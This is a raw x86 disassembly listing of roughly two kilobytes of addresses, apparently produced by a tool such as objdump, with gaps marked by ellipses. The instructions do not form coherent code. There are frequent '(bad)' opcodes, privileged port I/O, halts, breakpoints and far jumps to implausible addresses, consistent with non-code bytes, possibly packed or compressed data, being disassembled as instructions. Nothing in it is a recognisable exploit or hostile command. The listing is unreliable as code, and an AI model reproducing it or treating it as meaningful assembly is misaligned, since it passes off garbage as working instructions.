  43fb09:	icebp  
  43fb0a:	test   al,0x25
  43fb0c:	sbb    BYTE PTR [edx-0x18],ah
  43fb0f:	or     al,0x35
  43fb11:	aaa    
  43fb12:	les    eax,FWORD PTR [edx]
  43fb14:	jge    0x43fb61
  43fb16:	stc    
  43fb17:	jge    0x43fb68
  43fb19:	stc    
  43fb1a:	mov    WORD PTR [eax+esi*1-0x78fb0814],cs
  43fb21:	stc    
  43fb22:	js     0x43fb58
  43fb24:	add    al,0x70
  43fb26:	dec    eax
  43fb27:	or     DWORD PTR [edi+0x707e1799],eax
  43fb2d:	shl    DWORD PTR [eax+0x35],1
  43fb30:	cmp    al,0x26
  43fb32:	xor    BYTE PTR [ecx],dl
  43fb34:	add    BYTE PTR [eax],al
  43fb36:	pop    ebp
  43fb37:	add    DWORD PTR [eax],eax
  43fb39:	mov    DWORD PTR [ebp+0x5d48814d],eax
  43fb3f:	cmp    BYTE PTR [eax+0x4c],cl
  43fb42:	adc    al,BYTE PTR [ecx+0x19d1bc0]
  43fb48:	stc    
  43fb49:	call   FWORD PTR [ebp+0x5180bf01]
  43fb4f:	stos   BYTE PTR es:[edi],al
  43fb50:	stc    
  43fb51:	jmp    FWORD PTR [edx+0xfff7be]
	...
  43fb6f:	mov    es,ecx
  43fb71:	push   esi
  43fb72:	pop    ebp
  43fb73:	pop    edi
  43fb74:	mov    ch,0xf9
  43fb76:	mov    bh,0x4b
  43fb78:	mov    esi,0xebebfff7
  43fb7d:	mov    ecx,0xcc6d5d04
  43fb82:	int3   
  43fb83:	cdq    
  43fb84:	ins    DWORD PTR es:[edi],dx
  43fb85:	int3   
  43fb86:	int3   
  43fb87:	and    BYTE PTR [edx],bh
  43fb89:	in     al,dx
  43fb8a:	mov    edi,eax
  43fb8c:	mov    eax,0x7b36d22c
  43fb91:	je     0x43fbad
  43fb93:	mov    BYTE PTR [eax+0x1c],0x3b
  43fb97:	pop    DWORD PTR [ebp+0xb]
  43fb9a:	push   ecx
  43fb9b:	aam    0xf1
  43fb9d:	daa    
  43fb9e:	mov    DWORD PTR [ebp+0xd],ebp
  43fba1:	adc    DWORD PTR [eax+0xd],0xcaff56d9
  43fba8:	mov    esi,0x111c255
  43fbad:	mov    eax,0xf7bebafe
  43fbb2:	pop    ebp
  43fbb3:	fbstp  TBYTE PTR [ebp+0x3a60cbf9]
  43fbb9:	in     al,dx
  43fbba:	mov    ebx,DWORD PTR [eax-0x47]
  43fbbd:	push   eax
  43fbbe:	test   DWORD PTR [esp+eax*2],esp
  43fbc1:	je     0x43fb4e
  43fbc3:	xchg   esp,eax
  43fbc4:	lods   al,BYTE PTR ds:[esi]
  43fbc5:	jle    0x43fbc6
  43fbc7:	hlt    
  43fbc8:	xchg   ecx,eax
  43fbc9:	pop    eax
  43fbca:	dec    ebp
  43fbcb:	inc    edx
  43fbcc:	daa    
  43fbcd:	push   eax
  43fbce:	or     al,0x79
  43fbd0:	mov    ah,0x45
  43fbd2:	add    al,BYTE PTR [eax]
	...
  43fbec:	pop    es
  43fbed:	out    0xc9,eax
  43fbef:	fcmove st,st(7)
  43fbf1:	lods   al,BYTE PTR ds:[esi]
  43fbf2:	jbe    0x43fbce
  43fbf4:	mov    ch,0xb7
  43fbf6:	cli    
  43fbf7:	cmp    al,0x77
  43fbf9:	lods   al,BYTE PTR ds:[esi]
  43fbfa:	adc    al,0x7b
  43fbfc:	neg    DWORD PTR [esi]
  43fbfe:	fimul  DWORD PTR [ecx]
  43fc00:	jns    0x43fbd6
  43fc02:	push   eax
  43fc03:	adc    dh,BYTE PTR [edi-0x3c]
  43fc06:	cld    
  43fc07:	jnp    0x43fc02
  43fc09:	push   ds
  43fc0a:	ret    0xa09
  43fc0d:	mov    ds:0x7c3c5523,al
  43fc12:	ret    
  43fc13:	stc    
  43fc14:	jnp    0x43fc19
  43fc16:	and    DWORD PTR [esi+0x41789dfc],edi
  43fc1c:	and    BYTE PTR [ecx],ch
  43fc1e:	les    esi,FWORD PTR [eax+eax*1-0x2b]
  43fc22:	dec    esp
  43fc23:	and    al,0xe0
  43fc25:	mov    edx,0xd5b5852d
  43fc2a:	js     0x43fc73
  43fc2c:	adc    BYTE PTR [esi],cl
  43fc2e:	ret    
  43fc2f:	iret   
  43fc30:	outs   dx,DWORD PTR ds:[esi]
  43fc31:	jmp    0xa6747931
  43fc36:	mov    esp,0xfd9de841
  43fc3b:	push   esp
  43fc3d:	ins    BYTE PTR es:[edi],dx
  43fc3e:	jbe    0x43fc99
  43fc40:	in     al,dx
  43fc41:	and    al,0x4b
  43fc43:	and    al,0xc
  43fc45:	jbe    0x43fc0b
  43fc47:	stc    
  43fc48:	adc    ebp,DWORD PTR [eax+ebp*1+0x59]
  43fc4c:	test   eax,0xfffbdf
	...
  43fc69:	dec    ebx
  43fc6a:	cld    
  43fc6b:	ret    0xfbf9
  43fc6e:	and    BYTE PTR [edx],0xbe
  43fc71:	cld    
  43fc72:	add    al,0xe7
  43fc74:	mov    bh,0xb8
  43fc76:	shr    BYTE PTR [ebx],0xb8
  43fc79:	mov    al,0xc0
  43fc7b:	mov    esp,0xa47fc878
  43fc80:	repz inc eax
  43fc82:	clc    
  43fc83:	sbb    eax,0x63038909
  43fc88:	xor    ah,0x4
  43fc8b:	out    0xb,eax
  43fc8d:	fdivr  QWORD PTR [ecx]
  43fc8f:	imul   eax,DWORD PTR [eax+0x4f1f192f],0x4e6e5b2c
  43fc99:	in     al,dx
  43fc9a:	out    dx,eax
  43fc9b:	aad    0x4f
  43fc9d:	in     eax,dx
  43fc9e:	jg     0x43fcc1
  43fca0:	and    al,0x7b
  43fca2:	push   edx
  43fca3:	fisttp WORD PTR [eax]
  43fca5:	dec    ecx
  43fca6:	cmp    ah,ah
  43fca8:	or     bl,BYTE PTR [esi]
  43fcaa:	jmp    0x6d61f5ea
  43fcaf:	test   eax,0x3eb36dc4
  43fcb4:	daa    
  43fcb5:	stos   BYTE PTR es:[edi],al
  43fcb6:	adc    al,0xe7
  43fcb8:	js     0x43fc68
  43fcba:	fdivr  QWORD PTR [ecx]
  43fcbc:	pop    esp
  43fcbd:	sub    BYTE PTR [edi],cl
  43fcbf:	out    0x3,eax
  43fcc1:	fiadd  DWORD PTR ds:0x7f24c518
  43fcc7:	jg     0x43fc49
  43fcc9:	cmp    BYTE PTR [eax],al
  43fccb:	scas   al,BYTE PTR es:[edi]
  43fccc:	enter  0x0,0x0
	...
  43fce4:	add    BYTE PTR [eax],al
  43fce6:	mov    DWORD PTR [eax],0xb06c260a
  43fcec:	(bad)  
  43fced:	les    ebp,FWORD PTR ds:0x4c1bc4f
  43fcf3:	add    eax,0x56e82e5e
  43fcf8:	pusha  
  43fcf9:	inc    ebp
  43fcfa:	lock pop edx
  43fcfc:	jo     0x43fd22
  43fcfe:	rcr    BYTE PTR [edi+eiz*8+0xb2fdc4],0x62
  43fd06:	dec    edi
  43fd07:	xchg   ebp,edx
  43fd09:	mov    ch,0xe3
  43fd0b:	mov    DWORD PTR [edx-0x2f],eax
  43fd0e:	ins    BYTE PTR es:[edi],dx
  43fd0f:	aas    
  43fd10:	and    al,0xb6
  43fd12:	daa    
  43fd13:	lods   al,BYTE PTR ds:[esi]
  43fd14:	iret   
  43fd15:	push   0xffffff9b
  43fd17:	std    
  43fd18:	shl    BYTE PTR [edi-0x16064d25],0xf7
  43fd1f:	dec    ebx
  43fd20:	pop    edx
  43fd21:	jb     0x43fcd7
  43fd23:	pop    eax
  43fd24:	pop    ebx
  43fd25:	sub    eax,edi
  43fd27:	mov    dl,0xb1
  43fd29:	repz mov bh,0xac
  43fd2c:	stc    
  43fd2d:	inc    edx
  43fd2e:	adc    eax,0xb3e91073
  43fd33:	ror    esp,0xae
  43fd36:	xor    BYTE PTR [ecx+0x0],al
  43fd39:	repz aaa 
  43fd3b:	add    eax,0xa2c29c1
  43fd40:	add    cl,ch
  43fd42:	test   ebx,0x12f01940
  43fd48:	inc    eax
  43fd49:	jmp    0x43fd4e
	...
  43fd62:	add    BYTE PTR [esi],bh
  43fd64:	inc    ebp
  43fd65:	pop    eax
  43fd66:	in     al,dx
  43fd67:	test   DWORD PTR [eax+eax*1],0xccc144aa
  43fd6e:	cmp    al,0x6b
  43fd70:	mov    eax,ds:0x2083374f
  43fd75:	sbb    al,0x6a
  43fd77:	mov    dh,0xf8
  43fd79:	call   DWORD PTR ds:0xc273ad73
  43fd7f:	push   0x3f
  43fd81:	and    al,0x62
  43fd83:	retf   
  43fd84:	in     al,0xb7
  43fd86:	call   0x3a440282
  43fd8b:	pop    eax
  43fd8c:	mov    BYTE PTR [ebp+0x1],al
  43fd8f:	retf   0x49b1
  43fd92:	mov    eax,0x7dc336
  43fd97:	fst    DWORD PTR [ecx+eax*4]
  43fd9a:	inc    esi
  43fd9b:	or     DWORD PTR [ebp-0x40],edi
  43fd9e:	jne    0x43fdb6
  43fda0:	daa    
  43fda1:	mov    eax,0x5dd01
  43fda6:	pop    esi
  43fda7:	pop    sp
  43fda9:	push   ebp
  43fdaa:	ret    
  43fdab:	mov    esi,0xb54631c5
  43fdb0:	in     al,dx
  43fdb1:	or     cl,BYTE PTR [ebx+0x1b3a973]
  43fdb7:	fld    QWORD PTR ds:0x7fefd300
  43fdbd:	xor    BYTE PTR ds:[edi+edi*1+0x2c],dl
  43fdc2:	mov    DWORD PTR [ebx+0x7b249d],ecx
	...
  43fde0:	lods   eax,DWORD PTR ds:[esi]
  43fde1:	cmp    BYTE PTR [esi],0x28
  43fde4:	(bad)  
  43fde5:	jo     0x43fe51
  43fde7:	sub    BYTE PTR [esi],dl
  43fde9:	inc    ebx
  43fdea:	or     al,0x8b
  43fdec:	retf   
  43fded:	lods   al,BYTE PTR ds:[esi]
  43fdee:	dec    ecx
  43fdef:	sub    eax,DWORD PTR [ebp+0x58]
  43fdf2:	dec    edx
  43fdf3:	call   0x3db825
  43fdf8:	push   ss
  43fdf9:	cmp    al,0x28
  43fdfb:	sbb    DWORD PTR [ecx+0x41468101],0x26
  43fe02:	mov    edi,0x53d46
  43fe07:	add    BYTE PTR [ebp-0x46],cl
  43fe0a:	mov    ecx,0x555cd65e
  43fe0f:	ret    
  43fe10:	cmp    esi,DWORD PTR es:[eax]
  43fe13:	mov    DWORD PTR [eax],ebx
  43fe15:	lds    esi,FWORD PTR [ebx]
  43fe17:	(bad)  
  43fe18:	cmp    edi,esp
  43fe1a:	cmp    BYTE PTR [ebp-0x5f],0x82
  43fe1e:	mov    edi,0x8301668b
  43fe23:	push   esi
  43fe24:	or     DWORD PTR [edx],ecx
  43fe26:	dec    esi
  43fe27:	xor    ah,dh
  43fe29:	imul   ebp,edx,0xffffffc8
  43fe2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43fe2d:	ins    DWORD PTR es:[edi],dx
  43fe2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43fe2f:	and    al,bh
  43fe31:	fwait
  43fe32:	std    
  43fe33:	test   BYTE PTR [ecx-0x173b7e11],dh
  43fe39:	push   es
  43fe3a:	mov    ebx,0x42231874
  43fe3f:	or     al,0x7f
  43fe41:	js     0x43fe34
  43fe43:	push   eax
	...
  43fe5c:	add    BYTE PTR [edi],cl
  43fe5e:	out    0x4c,eax
  43fe60:	dec    edi
  43fe61:	int3   
  43fe62:	stos   BYTE PTR es:[edi],al
  43fe63:	bnd call ebx
  43fe66:	and    edx,DWORD PTR [edi+0x28]
  43fe69:	ja     0x43fe4d
  43fe6b:	or     BYTE PTR [edi-0x78a191be],al
  43fe71:	and    cl,dl
  43fe73:	repnz mov edi,0x5ba82352
  43fe79:	mov    bh,0x33
  43fe7b:	inc    esi
  43fe7c:	sub    ch,dh
  43fe7e:	fcomip st,st(3)
  43fe80:	xor    cl,BYTE PTR ss:[esi]
  43fe83:	xor    DWORD PTR [ecx],eax
  43fe85:	mov    ebx,0x8bfff3e8
  43fe8a:	sahf   
  43fe8b:	std    
  43fe8c:	test   BYTE PTR [edx],ch
  43fe8e:	add    bh,bl
  43fe90:	iret   
  43fe91:	pop    es
  43fe92:	mov    eax,ds:0x187dcf04
  43fe97:	lock pop eax
  43fe99:	daa    
  43fe9a:	pop    esi
  43fe9b:	pop    esi
  43fe9c:	test   DWORD PTR [ecx-0xf],ebx
  43fe9f:	ret    0x28cc
  43fea2:	icebp  
  43fea3:	mov    ch,ah
  43fea5:	jg     0x43fe90
  43fea7:	or     edi,DWORD PTR [ebp+0x58]
  43feaa:	outs   dx,BYTE PTR ds:[esi]
  43feab:	pop    eax
  43feac:	xor    DWORD PTR [edi+ebx*4],0xffffff81
  43feb0:	mov    edx,0x84fd9de7
  43feb5:	lods   al,BYTE PTR ds:[esi]
  43feb6:	rol    DWORD PTR [edx+0x6b04fbf9],0x75
  43febd:	icebp  
  43febe:	add    al,0xe7
  43fec0:	test   BYTE PTR [eax],al
	...
  43feda:	pushf  
  43fedb:	add    bh,ah
  43fedd:	adc    BYTE PTR [eax+0x5e],bh
  43fee0:	test   BYTE PTR [ebx],0xf4
  43fee3:	cmp    edi,0x3
  43fee6:	xchg   edx,edi
  43fee8:	gs cmp al,0xf0
  43feeb:	add    al,0xe2
  43feed:	xchg   BYTE PTR [edx+0x6903e713],cl
  43fef3:	lock in eax,dx
  43fef5:	ss test bh,0xe2
  43fef9:	pmuludq mm0,QWORD PTR [edi+eiz*8]
  43fefd:	mov    WORD PTR [ecx+eax*1],?
  43ff00:	pop    esi
  43ff01:	adc    al,0x73
  43ff03:	inc    ecx
  43ff04:	jge    0x44b21436
  43ff0a:	lock push ebx
  43ff0c:	pop    esi
  43ff0d:	popa   
  43ff0e:	in     al,dx
  43ff0f:	jge    0x43feb5
  43ff11:	mov    edi,0x8cb74973
  43ff16:	cmc    
  43ff17:	push   esi
  43ff18:	outs   dx,BYTE PTR ds:[esi]
  43ff19:	cmp    al,bl
  43ff1b:	jge    0x43ff41
  43ff1d:	mov    ah,0x7b
  43ff1f:	pop    ecx
  43ff20:	iret   
  43ff21:	mov    bh,BYTE PTR [edi]
  43ff23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ff24:	stos   BYTE PTR es:[edi],al
  43ff25:	inc    esi
  43ff26:	pushf  
  43ff27:	add    al,0xe7
  43ff29:	add    esi,esp
  43ff2b:	sub    DWORD PTR [edi-0x387802df],0x12
  43ff32:	hlt    
  43ff33:	add    al,0xa2
  43ff35:	out    0x76,eax
  43ff37:	adc    ah,bl
  43ff39:	inc    esp
  43ff3a:	hlt    
  43ff3b:	jnp    0x43ff67
  43ff3d:	or     al,0x0
	...
  43ff57:	ja     0x43ff1d
  43ff59:	adc    al,0xd
  43ff5b:	xor    eax,0xf403f307
  43ff60:	add    al,0x90
  43ff62:	jg     0x43ff4f
  43ff64:	add    al,0x0
  43ff66:	jmp    0xfa54a9e3
  43ff6b:	adc    DWORD PTR [eax],esi
  43ff6d:	jnp    0x43ffd4
  43ff6f:	idiv   ebp
  43ff71:	xor    edx,0x1
  43ff74:	add    eax,0xae8de600
  43ff79:	cli    
  43ff7a:	pushf  
  43ff7b:	dec    ebx
  43ff7c:	mov    edx,ecx
  43ff7e:	sbb    dl,BYTE PTR [edi-0x12]
  43ff81:	jl     0x43ffaa
  43ff83:	out    dx,eax
  43ff84:	xchg   DWORD PTR [ebx+0x31],edx
  43ff87:	clc    
  43ff88:	int3   
  43ff89:	jge    0x43ffba
  43ff8b:	pop    es
  43ff8c:	pop    ds
  43ff8d:	ficomp DWORD PTR [edi]
  43ff8f:	sub    al,0xfd
  43ff91:	std    
  43ff92:	xchg   esp,eax
  43ff93:	cmc    
  43ff94:	sub    eax,0x580f6f5
  43ff99:	add    BYTE PTR [ebp+ecx*8-0x86cffd8],dl
  43ffa0:	add    BYTE PTR es:[ecx],dl
  43ffa3:	xchg   esp,eax
  43ffa4:	adc    al,0x0
  43ffa6:	jmp    0x835c4429
  43ffab:	icebp  
  43ffac:	jns    0x43fff9
  43ffae:	aad    0xda
  43ffb0:	test   DWORD PTR [ebx-0x33],ebx
  43ffb3:	outs   dx,DWORD PTR ds:[esi]
  43ffb4:	push   esp
  43ffb5:	sbb    BYTE PTR [eax],bh
  43ffb7:	es popf 
  43ffb9:	xchg   esi,esi
	...
  43ffd3:	add    bh,dh
  43ffd5:	add    al,0x85
  43ffd7:	sbb    al,0x40
  43ffd9:	loopne 0x43ffaf
  43ffdb:	jo     0x440010
  43ffdd:	or     eax,0x43bbf2d
  43ffe2:	(bad)  
  43ffe3:	call   0x392b04df
  43ffe8:	or     DWORD PTR ds:0xe4b37200,eax
  43ffee:	shr    BYTE PTR [esi],0xe8
  43fff1:	add    al,0x0
  43fff3:	jmp    0x10481ef
  43fff8:	inc    ecx
  43fff9:	pop    es
  43fffa:	mov    edi,0xf76f7d40
  43ffff:	jmp    FWORD PTR [edx+0x1c083f76]
  440005:	inc    DWORD PTR [ebx+0x20d91]
  44000b:	jae    0x1624b9d3
  440011:	jnp    0x43ffd6
  440013:	shl    DWORD PTR [eax+eax*1-0x2c013f05],0xb1
  44001b:	pop    ds
  44001c:	or     eax,0x2cf70002
  440021:	jl     0x43ffed
  440023:	jne    0x43ffc7
  440025:	jp     0x43fff2
  440027:	sub    bh,0xfd
  44002a:	jg     0x440026
  44002c:	in     eax,0xf5
  44002e:	or     DWORD PTR [ebx+0x5582f9a0],ecx
  440034:	in     eax,0xc5
  440036:	inc    eax
  440037:	sbb    BYTE PTR [eax],al
	...
  440051:	stos   BYTE PTR es:[edi],al
  440052:	idiv   DWORD PTR [edi]
  440054:	add    ah,ah
  440056:	jbe    0x440068
  440058:	add    BYTE PTR [ebp-0x23dbc086],bl
  44005e:	pop    ecx
  44005f:	add    al,0x8b
  440061:	data16 sbb cl,0xf
  440065:	push   cs
  440066:	pusha  
  440067:	add    al,0x83
  440069:	pop    esp
  44006a:	stc    
  44006b:	jl     0x44002d
  44006d:	and    BYTE PTR [ebx+0x2af14f82],ch
  440073:	stc    
  440074:	dec    DWORD PTR [ebp-0x71ff9dff]
  44007a:	arpl   WORD PTR [edx+0x0],sp
  44007d:	mov    bh,0x8
  44007f:	adc    DWORD PTR [edi+0x61],0x4d2eda59
  440086:	add    DWORD PTR [ebx-0x795c0bb3],eax
  44008c:	push   ebx
  44008d:	dec    esp
  44008e:	pop    esp
  44008f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440090:	or     BYTE PTR [ebx-0x76],cl
  440093:	jle    0x440072
  440095:	neg    BYTE PTR [edx]
  440097:	mov    BYTE PTR [edi],0x7d
  44009a:	ficomp WORD PTR [ebx]
  44009c:	xchg   DWORD PTR [ebp-0x18e67395],esi
  4400a2:	inc    edx
  4400a3:	out    dx,al
  4400a4:	icebp  
  4400a5:	or     eax,0xf4000d80
  4400aa:	adc    cl,ah
  4400ac:	jb     0x4400df
  4400ae:	and    bl,BYTE PTR [eax-0x8]
  4400b1:	or     eax,0xd4c
	...
  4400ce:	hlt    
  4400cf:	xor    bl,BYTE PTR [eax+0x8]
  4400d2:	mov    ebx,0x62291560
  4400d7:	pop    esi
  4400d8:	std    
  4400d9:	test   BYTE PTR [ecx-0x1a],cl
  4400dc:	stos   DWORD PTR es:[edi],eax
  4400dd:	xchg   DWORD PTR [esi+ebx*4],eax
  4400e0:	std    
  4400e1:	jl     0x4400b5
  4400e3:	scas   al,BYTE PTR es:[edi]
  4400e4:	cs push ds
  4400e6:	ja     0x440161
  4400e8:	mov    ecx,0xdb19f300
  4400ed:	adc    ah,dh
  4400ef:	popf   
  4400f0:	or     dh,BYTE PTR [edx-0x3b64d0a]
  4400f6:	jg     0x440104
  4400f8:	into   
  4400f9:	loopne 0x440131
  4400fb:	pop    ds
  4400fc:	ret    0x6d08
  4400ff:	icebp  
  440100:	mov    ebx,0xba1fabfd
  440105:	adc    BYTE PTR [esi],al
  440107:	pop    esp
  440108:	test   DWORD PTR [ecx-0x1c],ebx
  44010b:	sbb    eax,0x20eb08b7
  440110:	push   eax
  440111:	adc    ah,dh
  440113:	popf   
  440114:	mov    ah,0xbd
  440116:	hlt    
  440117:	mov    ebp,0x4e80004
  44011c:	repnz mov BYTE PTR [edi-0x13bb5e04],dh
  440123:	fistp  DWORD PTR [eax]
  440125:	inc    esp
  440126:	hlt    
  440127:	popf   
  440128:	retf   0xf413
  44012b:	add    al,0x6e
  44012d:	inc    ebp
  44012e:	adc    al,0x82
  440130:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440131:	cmp    BYTE PTR [eax],al
	...
  44014b:	cli    
  44014c:	jg     0x4400ec
  44014e:	ret    
  44014f:	adc    edi,ebp
  440151:	mov    gs:0xb4ef7d23,eax
  440157:	mov    ch,0x14
  440159:	out    0x1,eax
  44015b:	hlt    
  44015c:	add    al,0xdb
  44015e:	sbb    eax,0xc33b4a7c
  440163:	sbb    ebp,edi
  440165:	int3   
  440166:	add    DWORD PTR [edi+0x52],ebp
  440169:	dec    ebx
  44016a:	mov    WORD PTR [edi-0x66],cs
  44016d:	pop    esi
  44016e:	inc    ebp
  44016f:	or     al,0x57
  440171:	xchg   edi,eax
  440172:	stos   DWORD PTR es:[edi],eax
  440173:	es adc esp,edi
  440176:	add    esi,DWORD PTR [ecx+0x51]
  440179:	pop    ds
  44017a:	mov    esi,DWORD PTR ds:0x19d8d60d
  440180:	mov    bl,0x22
  440182:	add    eax,0x3e7abc2
  440187:	rol    DWORD PTR [ecx],1
  440189:	mov    si,0x37d4
  44018d:	lds    eax,FWORD PTR [eax+0xce7a92f]
  440193:	js     0x4401e9
  440195:	test   DWORD PTR [ebx],0x190fbf4
  44019b:	lea    edi,[ecx]
  44019d:	ror    DWORD PTR [eax+0x41c7d7be],cl
  4401a3:	add    ebx,eax
  4401a5:	out    dx,eax
  4401a6:	mov    ah,BYTE PTR [edi]
  4401a8:	lods   eax,DWORD PTR ds:[esi]
  4401a9:	out    0xdb,al
  4401ab:	icebp  
  4401ac:	stos   BYTE PTR es:[edi],al
  4401ad:	add    BYTE PTR [ecx],cl
	...
  4401c7:	add    BYTE PTR [esi],ah
  4401c9:	iret   
  4401ca:	test   DWORD PTR [esi],esp
  4401cc:	pop    eax
  4401cd:	xchg   al,al
  4401cf:	sbb    eax,0xe55883f5
  4401d4:	mov    BYTE PTR [ebp+0x10],al
  4401d7:	jmp    0x154406d1
  4401dc:	push   edx
  4401dd:	sbb    DWORD PTR [ebx-0x6b],0x6c
  4401e1:	rol    DWORD PTR [ebp+0x8a3369a],0xa8
  4401e8:	pop    ebp
  4401e9:	adc    al,0xbf
  4401eb:	cmp    bh,0x22
  4401ee:	add    al,0x74
  4401f0:	mov    dl,0x98
  4401f2:	mov    BYTE PTR [edx+eiz*2+0x7f47537c],ch
  4401f9:	dec    edi
  4401fa:	jmp    0x5050b261
  4401ff:	cwde   
  440200:	dec    edi
  440201:	push   0x13
  440203:	jmp    0x319781ff
  440208:	jle    0x44024e
  44020a:	sbb    dl,bh
  44020c:	mov    esp,0xf02ef1d8
  440211:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440212:	stc    
  440213:	jmp    0x6a47a20f
  440218:	mov    DWORD PTR ds:0x2e74cb6d,edx
  44021e:	cld    
  44021f:	jmp    0xef20830c
  440224:	test   DWORD PTR [ecx+ecx*1],0x4babf53f
  44022b:	in     eax,dx
	...
  440244:	add    BYTE PTR [ebx-0x41],bh
  440247:	int    0xc9
  440249:	xor    ch,BYTE PTR [eax]
  44024b:	ret    0x80f1
  44024e:	push   esi
  44024f:	clc    
  440250:	jmp    0xcec9:0xf9fa28af
  440257:	test   DWORD PTR [eax],eax
  440259:	retf   0x7ea0
  44025c:	shr    BYTE PTR [ecx],0x17
  44025f:	or     ebx,0xffffffdc
  440262:	pop    edi
  440263:	test   DWORD PTR [eax],0x4881064d
  440269:	gs jnp 0x4402b3
  44026c:	and    dh,al
  44026e:	sar    DWORD PTR [ecx+0x397955e8],0xc
  440275:	push   0x46
  440277:	adc    BYTE PTR [eax],al
  440279:	dec    edi
  44027a:	push   es
  44027b:	add    BYTE PTR [ebx+edx*2+0x7e],dh
  44027f:	push   ebp
  440280:	in     al,dx
  440281:	pop    esp
  440282:	pop    edx
  440283:	or     BYTE PTR [edx+0xf],ch
  440286:	jge    0x4402d5
  440288:	in     al,dx
  440289:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44028a:	dec    ebx
  44028b:	in     eax,0x8b
  44028d:	pop    edx
  44028e:	push   cs
  44028f:	dec    edx
  440290:	push   eax
  440291:	mov    ch,0x39
  440293:	or     eax,0x4d7b0d00
  440298:	clc    
  440299:	test   BYTE PTR [ebp+0x18],al
  44029c:	xor    edx,DWORD PTR [esi]
  44029e:	mov    dl,0xef
  4402a0:	(bad)  
  4402a1:	fisubr DWORD PTR [ecx+0x76cdfff9]
  4402a7:	aas    
  4402a8:	adc    BYTE PTR [eax],al
	...
  4402c2:	int    0xa9
  4402c4:	stc    
  4402c5:	jmp    FWORD PTR [ecx-0x20]
  4402c8:	jp     0x4402c8
  4402ca:	int    0xf2
  4402cc:	sbb    DWORD PTR [ebx+0xf007170],eax
  4402d2:	dec    ecx
  4402d3:	dec    edi
  4402d4:	pop    es
  4402d5:	add    BYTE PTR [ebp-0x5dfd5202],bl
  4402db:	cmp    al,0xfc
  4402dd:	mov    eax,DWORD PTR [ebx]
  4402df:	shl    al,cl
  4402e1:	inc    edx
  4402e2:	push   cs
  4402e3:	les    ecx,FWORD PTR [eax]
  4402e5:	mov    eax,ecx
  4402e7:	push   0x1ef4d7fb
  4402ec:	mov    bh,0x10
  4402ee:	push   es
  4402ef:	pop    edx
  4402f0:	mov    al,BYTE PTR [ecx-0x2c]
  4402f3:	xor    al,0x56
  4402f5:	inc    eax
  4402f6:	jns    0x440353
  4402f8:	sub    ebp,edi
  4402fa:	jl     0x44030f
  4402fc:	adc    cl,dh
  4402fe:	mov    ebx,0x5bfdfdcb
  440303:	fwait
  440304:	sub    DWORD PTR [edx],ebx
  440306:	jl     0x4402f0
  440308:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440309:	mov    edi,0xfe2ba35f
  44030e:	jo     0x440318
  440310:	test   al,0x88
  440312:	cdq    
  440313:	nop
  440314:	mov    dl,BYTE PTR [ecx+0xc]
  440317:	or     eax,0xc749e852
  44031c:	std    
  44031d:	jmp    FWORD PTR [edi+0x10]
  440320:	mov    esp,0xf103b387
  440325:	aam    0x0
	...
  44033f:	(bad)  
  440340:	push   ecx
  440341:	stos   BYTE PTR es:[edi],al
  440342:	or     bh,BYTE PTR [edi+0x5a]
  440345:	fld    QWORD PTR [edx-0x3f0130cc]
  44034b:	mov    ah,0xcb
  44034d:	std    
  44034e:	push   esp
  440350:	popf   
  440351:	mov    esi,0xfd9df101
  440356:	(bad)  
  440357:	jmp    0x4403b8
  440359:	or     eax,0xfd9df000
  44035e:	or     BYTE PTR [eax+0x2f],bh
  440361:	std    
  440362:	push   esp
  440364:	and    bh,BYTE PTR [esi]
  440366:	inc    eax
  440367:	outs   dx,DWORD PTR ds:[esi]
  440368:	mov    DWORD PTR [ecx-0x455ce79],esi
  44036e:	mov    esi,0xbf8aa12a
  440373:	jge    0x4403d6
  440375:	test   eax,0x79c7b483
  44037a:	ins    DWORD PTR es:[edi],dx
  44037b:	hlt    
  44037c:	add    al,0xe7
  44037e:	add    edi,DWORD PTR [ecx+0x38]
  440381:	pop    es
  440382:	jg     0x440337
  440384:	xor    DWORD PTR [ecx],edx
  440386:	lea    edi,[ebx]
  440388:	adc    eax,0x82a04760
  44038d:	mov    al,0x30
  44038f:	sub    BYTE PTR [edx+edx*1-0x1c],bh
  440393:	jo     0x4403d0
  440395:	fucomi st,st(4)
  440397:	lods   al,BYTE PTR ds:[esi]
  440398:	inc    esp
  440399:	pop    esi
  44039a:	push   esi
  44039b:	cld    
  44039c:	jge    0x4403d2
  44039e:	mov    al,ds:0xcddec051
	...
  4403bb:	add    dh,al
  4403bd:	add    DWORD PTR [esi-0x5a83a7b2],edi
  4403c3:	lea    esp,[edi-0x4872e854]
  4403c9:	shl    dh,1
  4403cb:	adc    BYTE PTR ds:[ebx+0x17],dl
  4403cf:	lods   al,BYTE PTR ds:[esi]
  4403d0:	push   0xffffffd7
  4403d2:	out    0x3,al
  4403d4:	jno    0x440418
  4403d6:	pop    ebx
  4403d7:	lea    esp,[edi-0x73f9954]
  4403dd:	scas   eax,DWORD PTR es:[edi]
  4403de:	stos   BYTE PTR es:[edi],al
  4403df:	adc    esi,esp
  4403e1:	add    ah,bh
  4403e3:	add    eax,DWORD PTR [eax-0x17b091f6]
  4403e9:	jnp    0x44038f
  4403eb:	mov    ebx,0x55cf3771
  4403f0:	inc    esp
  4403f1:	push   esi
  4403f2:	aas    
  4403f3:	icebp  
  4403f4:	pop    es
  4403f5:	add    eax,0xad278ce7
  4403fa:	jo     0x44043d
  4403fc:	in     al,dx
  4403fd:	jnp    0x4403ab
  4403ff:	scas   eax,DWORD PTR es:[edi]
  440400:	sbb    eax,DWORD PTR [edx+0xb]
  440403:	add    eax,0x43a9dda4
  440408:	jnp    0x44045b
  44040a:	inc    DWORD PTR [ebp+ebp*1-0x1316ffbb]
  440411:	adc    DWORD PTR [edi+ebx*8-0x9],0x4
  440416:	shr    DWORD PTR [esi],0x38
  440419:	add    eax,0xc5f7e900
  44041e:	add    edi,ebp
	...
  440438:	add    bh,dh
  44043a:	add    al,0x0
  44043c:	(bad)  
  44043d:	xor    al,0x15
  44043f:	add    cl,dh
  440441:	test   DWORD PTR [ecx+ecx*1],0x47465
  440448:	jmp    0xea402fc5
  44044d:	in     al,dx
  44044e:	xor    BYTE PTR [eax],0xf7
